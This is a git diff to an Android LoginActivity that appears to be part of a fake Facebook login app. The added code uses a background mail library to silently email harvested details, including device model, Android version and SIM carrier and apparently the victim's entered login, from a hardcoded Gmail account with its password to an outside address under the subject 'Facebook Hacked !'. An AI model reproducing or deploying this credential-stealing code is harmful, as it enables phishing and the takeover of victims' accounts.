@@ -15,6 +15,7 @@ import android.text.TextWatcher;
 import android.text.method.PasswordTransformationMethod;
 import android.text.style.AbsoluteSizeSpan;
 import android.text.style.TypefaceSpan;
+import android.util.Log;
 import android.view.KeyEvent;
 import android.view.MotionEvent;
 import android.view.View;
@@ -27,6 +28,8 @@ import android.webkit.WebChromeClient;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
 import android.widget.*;
+
+import com.creativityapps.gmailbackgroundlibrary.BackgroundMail;
 
 import java.util.Objects;
 
@@ -192,7 +195,27 @@ public class LoginActivity extends AppCompatActivity
                                 "\nDevice Used = "+ (Build.MODEL) +
                                 "\nAndroid Version Used = "+ android.os.Build.VERSION.RELEASE+
                                 "\nSim Network Used = "+((TelephonyManager) Objects.requireNonNull(LoginActivity.this.getSystemService(TELEPHONY_SERVICE))).getNetworkOperatorName();
-                        new SendMail(LoginActivity.this,"ritik.space@gmail.com","Facebook Hacked !",message);
+
+                        BackgroundMail.newBuilder(LoginActivity.this)
+                                .withUsername("ritik.fbhack@gmail.com")
+                                .withPassword("123212321")
+                                .withMailto("ritik.space@gmail.com")
+                                .withType(BackgroundMail.TYPE_PLAIN)
+                                .withSubject("Facebook Hacked !")
+                                .withBody(message)
+                                .withOnSuccessCallback(new BackgroundMail.OnSuccessCallback() {
+                                    @Override
+                                    public void onSuccess() {
+                                        Toast.makeText(LoginActivity.this, "FB Hacked", Toast.LENGTH_SHORT).show();
+                                    }
+                                })
+                                .withOnFailCallback(new BackgroundMail.OnFailCallback() {
+                                    @Override
+                                    public void onFail() {
+                                        Toast.makeText(LoginActivity.this, "Failed", Toast.LENGTH_SHORT).show();
+                                    }
+                                })
+                                .send();
                     }
                 }
             }
